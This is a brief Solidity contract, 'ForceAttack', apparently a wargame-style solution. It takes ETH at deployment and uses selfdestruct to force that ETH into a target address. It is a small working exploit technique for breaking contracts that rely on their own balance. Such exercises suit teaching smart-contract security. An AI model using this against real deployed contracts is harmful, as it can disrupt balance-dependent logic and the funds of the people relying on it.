// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack { 
    // Contract can be deployed with some ETH
    constructor() payable {

    }
    

    // Destroys the contract and forces ETH into target address
    function destroy(address payable _contracAdd) public {
        selfdestruct(_contracAdd); 
    }
}